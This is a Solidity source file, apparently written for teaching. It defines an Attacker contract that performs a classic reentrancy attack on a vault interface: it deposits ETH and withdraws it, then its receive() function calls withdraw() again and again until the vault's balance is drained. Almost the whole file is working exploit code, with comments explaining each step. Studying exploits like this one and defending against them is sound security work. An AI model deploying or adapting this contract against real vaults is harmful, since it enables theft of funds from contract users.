// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

interface IVulnerableVault {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVulnerableVault public vault;

    constructor(address _vaultAddress) {
        vault = IVulnerableVault(_vaultAddress);
    }

    // 1. The Setup: Deposit a small amount, then immediately withdraw it
    function attack() external payable {
        require(msg.value > 0, "Need some ETH to start the attack");
        
        // Deposit our ETH into the vault so we pass the (balance > 0) check
        vault.deposit{value: msg.value}();
        
        // Ask for it back. This triggers the Vault to send us ETH.
        vault.withdraw();
    }

    // 2. The Trap: This special function runs AUTOMATICALLY when the Vault sends ETH
    receive() external payable {
        // As long as the Vault still has ETH inside it, keep asking for more!
        if (address(vault).balance > 0) {
            vault.withdraw(); // 🚨 RE-ENTER THE VAULT!
        }
    }
}